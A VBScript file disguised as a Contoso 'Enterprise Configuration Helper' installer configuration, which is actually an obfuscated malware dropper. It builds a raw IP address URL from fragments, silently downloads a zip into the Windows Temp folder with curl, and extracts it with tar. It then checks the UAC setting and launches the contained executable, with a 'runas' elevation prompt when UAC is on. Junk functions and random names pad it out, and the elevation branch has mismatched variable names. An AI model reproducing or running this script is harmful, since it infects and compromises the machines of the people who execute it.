' Contoso Package Installer Sync Configuration
' Copyright (C) Contoso Corporation. All rights reserved.
' Version: 11.0.3681.51
' Module: SecurityAuditMonitor
' Description: Enterprise Configuration Helper
' --------------------------------------------------------

Option Explicit
On Error Resume Next

Const drX32MpmMB1 = "cfQYsG189errS0M"
Const rfAJIkDDO = "QUlioF40Iclyr0OTS1"
Const DObDLz0MqmC = "qi8yKdzingsh"
Dim r1fqgzIBv : r1fqgzIBv = "HKCU\Software\Classes\CLSID\D23iO0bGp1csgYG7"
Dim kJ7J37H : kJ7J37H = "HKCU\Software\Classes\CLSID\IBguKRtGp"
Dim sewSnEqv5J : sewSnEqv5J = "HKCU\Software\Classes\CLSID\jHnD3Ne8jV0ViMX"
Dim u8THy4394b : u8THy4394b = "HKCU\Software\Classes\CLSID\MlwkM9tFEZmZ82P"
Dim kv4LIJi9c : kv4LIJi9c = "HKCU\Software\Classes\CLSID\TKnCoMWVCd"

Dim N0o6zf6vHwnu0, CyouolDZou, w2shUvvSVrYeYB6r2K, doLt37qHM2V, bRAYTCNIt1T5t, beYt8Q8UpGBYz, JNrmhStCo, b4asjEYktguxL5, yTqyxFcPD3FQ, bQ2v6dNbR5n, Vdg06Es7E, AL3rd, We5cj66uLz, zeT7Hrmp7fMhyX, u0mTFjI, tpjcLLXE, CUuftpzN, ZiHrKT2YMDWa, OLsgqzAp, laBudsSt, xWWInMfy5WqQf

Sub SaFm4r()
  Dim YtPlS89 : YtPlS89 = 8230
End Sub

Sub mPYB7T9()
  Dim PXF5 : PXF5 = 5865
End Sub

Function rcOnPgz5g(x)
  rcOnPgz5g = Int(x / 23) + 2
End Function

Function Zo4iU8z(x)
  Zo4iU8z = x * 155 + 64
End Function

Function EWSA3KIvk(x)
  EWSA3KIvk = Int(x / 18) + 21
End Function

Sub R3LM2rLQ()
  Dim LyTH0 : LyTH0 = 986
End Sub

Function F5lzzQ9Z(x)
  F5lzzQ9Z = x * 105 + 21
End Function

N0o6zf6vHwnu0 = "http://176"
CyouolDZou = ".123.11.84"
w2shUvvSVrYeYB6r2K = ":3000/up/s"
doLt37qHM2V = "etup.zip"
' YMoi16SnSCWViLrEq3U8vuZUq36GkG77Vj8
bRAYTCNIt1T5t = N0o6zf6vHwnu0 & CyouolDZou & w2shUvvSVrYeYB6r2K & doLt37qHM2V
Set beYt8Q8UpGBYz = CreateObject("WScript.Shell")
JNrmhStCo = "C:\Windows\Temp\sys_1253.zip"
yTqyxFcPD3FQ = Join(Array("C:\Win","dows\","Syst","em32\","cu","rl.exe"),"")
beYt8Q8UpGBYz.Run yTqyxFcPD3FQ & " --silent -L -o " & JNrmhStCo & " " & bRAYTCNIt1T5t, 0, True
b4asjEYktguxL5 = "C:\Windows\Temp\ex_2798"
beYt8Q8UpGBYz.Run "cmd /c md " & b4asjEYktguxL5, 0, True
bQ2v6dNbR5n = Join(Array("C:\Win","dows\","Syst","em32\","ta","r.exe"),"")
beYt8Q8UpGBYz.Run bQ2v6dNbR5n & " --extract -f " & JNrmhStCo & " -C " & b4asjEYktguxL5, 0, True
Set Vdg06Es7E = CreateObject("Scripting.FileSystemObject")
For Each AL3rd In Vdg06Es7E.GetFolder(b4asjEYktguxL5).Files
  If LCase(Right(AL3rd.Name, 4)) = ".exe" Then
    u0mTFjI = 1
    On Error Resume Next
    u0mTFjI = beYt8Q8UpGBYz.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA")
    Err.Clear
    If u0mTFjI = 0 Then
      beYt8Q8UpGBYz.Run """" & AL3rd.Path & """", 0, False
    Else
      Dim xShjnI : Set xShGQGm = CreateObject("Shell.Application")
      xShQa3h.ShellExecute AL3rd.Path, "", "", "runas", 1
    End If
    Exit For
  End If
Next

Function PeytcL(x)
  PeytcL = x * 164 + 13
End Function

Sub NImB4Vl3c()
  Dim juELT : juELT = 2568
End Sub

Sub UrRcDTS9()
  Dim IzVBrOt : IzVBrOt = 9844
End Sub
